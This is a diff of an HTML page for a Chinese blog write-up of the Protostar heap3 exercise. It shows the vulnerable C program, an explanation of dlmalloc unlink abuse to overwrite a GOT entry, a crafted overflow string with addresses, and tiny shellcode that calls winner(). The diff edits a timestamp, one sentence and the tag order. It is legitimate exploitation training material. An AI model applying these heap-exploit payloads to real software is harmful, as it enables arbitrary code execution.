@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-5.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-6.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-7.png?raw=true">
-<meta property="og:updated_time" content="2017-04-27T08:34:54.000Z">
+<meta property="og:updated_time" content="2017-04-27T08:37:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar-堆溢出学习-滥用堆metadata重定向程序执行">
 <meta name="twitter:description" content="0x00 序
@@ -203,7 +203,7 @@
 <h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *a, *b, *c;</div><div class="line"></div><div class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">free</span>(c);</div><div class="line">  <span class="built_in">free</span>(b);</div><div class="line">  <span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到<code>winner()</code>函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知<code>free()</code>函数中的<code>unlink()</code>函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行<code>winner()</code>函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。<br>就照着这个思路来一步步实现这个过程。</p>
 <h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.输入<code>AAAA</code> <code>BBBB</code> <code>CCCC</code>然后free前后后观察堆结构<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-0.png?raw=true" alt="0-0"><br>由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-1.png?raw=true" alt="0-1"><br>因为chunk的大小<80字节，所以free后存在单链表的fastbin中，`1-->2–&gt;3–&gt;null`的方式连接  </80字节，所以free后存在单链表的fastbin中，`1--></p>
-<p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为64字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p>
+<p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p>
 <p>3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。<br>构造字符串：<br><code>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x0c\xc0\x04\x08</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-3.png?raw=true" alt="0-3"></p>
 <p>4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-4.png?raw=true" alt="0-4"><br>这里我们用在线的转换工具下面的汇编转化为x86指令字符串</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x8048864</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">eax</span></div></pre></td></tr></table></figure>
@@ -460,30 +460,6 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">heap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">malloc</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">free</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
@@ -516,15 +492,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">metadata</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">DLMalloc</a>
+                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -536,7 +508,43 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">UAF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">metadata</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">DLMalloc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">malloc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">free</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -548,23 +556,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+                <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
+                <a href="javascript:void(0)" class="js-tag color5">dyld</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Crackme</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">看雪</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">iOS</a>
+                <a href="javascript:void(0)" class="js-tag color5">stub</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -580,15 +580,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
+                <a href="javascript:void(0)" class="js-tag color3">Crackme</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">dyld</a>
+                <a href="javascript:void(0)" class="js-tag color3">看雪</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">stub</a>
+                <a href="javascript:void(0)" class="js-tag color4">iOS</a>
               </li>
             
             <div class="clearfix"></div>
